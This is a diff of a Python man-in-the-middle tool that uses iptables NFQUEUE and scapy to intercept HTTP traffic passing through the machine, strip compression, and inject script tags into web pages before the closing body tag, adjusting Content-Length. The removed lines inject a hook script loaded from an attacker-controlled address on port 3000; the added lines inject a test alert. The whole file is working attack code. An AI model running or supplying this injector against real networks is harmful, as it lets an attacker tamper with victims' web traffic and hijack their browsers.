@@ -29,66 +29,59 @@ def config_iptables():
     subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
 
 
-def flush_iptables():
-    print("[-] Flushing IP tables")
-    subprocess.call(["iptables", "--flush"])
+import scapy.all as scapy
+import netfilterqueue
+import re
 
 
-def get_cmd_args():
-    parser = optparse.OptionParser()
-    parser.add_option("-d", "--download", dest="download_url", help="Destination URL for spoofed download")
-    (options, arguements) = parser.parse_args()
-
-    if not options.download_url:
-        parser.error("Use --help for usage info")
-
-    return options
+def set_load(pkt, load):
+    pkt[scapy.Raw].load = load
+    del pkt[scapy.IP].len
+    del pkt[scapy.IP].chksum
+    del pkt[scapy.TCP].chksum
+    return pkt
 
 
-def set_load(packet, load):
-    packet[scapy.Raw].load = load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-    return packet
+def process_packet(pkt):
+    scapy_packet = scapy.IP(pkt.get_payload())
+    if scapy_packet.haslayer(scapy.TCP):
 
-
-def analyze_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        packet_load = scapy_packet[scapy.Raw].load
-        # HTTP Requests
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Disabling Encoding")
-            packet_load = re.sub("Accept-Encoding:.*?\\r\\n", "", packet_load)
-            modified_packet = set_load(scapy_packet, packet_load)
-            packet.set_payload(str(modified_packet))
+            print("[+] Request")
 
-        # HTTP Responses
+            if scapy_packet.haslayer(scapy.Raw):
+                load = scapy_packet[scapy.Raw].load
+
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+                load = load.replace("HTTP/1.1", "HTTP/1.0")
+
+                if load != scapy_packet[scapy.Raw].load:
+                    new_packet = set_load(scapy_packet, load)
+                    pkt.set_payload(str(new_packet))
+
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Injecting")
-            injection_code = '<script src="http://<IP>:3000/hook.js"></script>'
-            packet_load = packet_load.replace("</body>", injection_code + "</body>")
-            modified_packet = set_load(scapy_packet, packet_load)
-            packet.set_payload(str(modified_packet))
+            print("[+] Response")
 
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", packet_load)
-            if content_length_search and "text/html" in packet_load:
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                packet_load = packet_load.replace(content_length, str(new_content_length))
-                modified_packet = set_load(scapy_packet, packet_load)
-                packet.set_payload(str(modified_packet))
+            if scapy_packet.haslayer(scapy.Raw):
+                load = scapy_packet[scapy.Raw].load
+                inject_code = '<script>alert("test")</script>'
+                load = load.replace("</body>", inject_code + "</body>")
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                if content_length_search and "text/html" in load:
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(inject_code)
+                    load = load.replace(content_length, str(new_content_length))
 
-    packet.accept()
+                if load != scapy_packet[scapy.Raw].load:
+                    new_packet = set_load(scapy_packet, load)
+                    pkt.set_payload(str(new_packet))
+
+    pkt.accept()
 
 
 queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, analyze_packet)
-
-print("[+] JS Injector Ready.")
-
+queue.bind(0, process_packet)
 try:
     queue.run()
 except KeyboardInterrupt:
-    print("[=] Complete. Program quiting...")
+    print(" ")
